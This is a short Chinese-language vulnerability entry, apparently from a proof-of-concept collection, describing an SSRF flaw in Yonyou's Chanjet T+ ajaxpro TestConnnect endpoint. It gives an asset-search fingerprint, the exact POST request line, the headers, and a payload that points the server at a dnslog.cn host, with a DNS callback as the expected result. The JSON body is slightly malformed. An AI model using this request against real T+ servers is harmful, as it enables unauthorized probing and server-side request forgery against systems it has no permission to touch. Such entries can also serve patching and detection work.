# 畅捷通ajaxpro接口存在ssrf漏洞

- **系统**：用友　|　**类型**：SSRF　|　**CVE**：—
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?method=TestConnnect HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=sfzg0pgxvld3ltgimecqkjg4; Hm_lvt_fd4ca40261bc424e2d120b806d985…`　`Priority: u=0, i`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 36`

**请求体 / payload**
```
"address":"ftlhbc.dnslog.cn"
}
```
- **预期**：200　|　DNSlog回显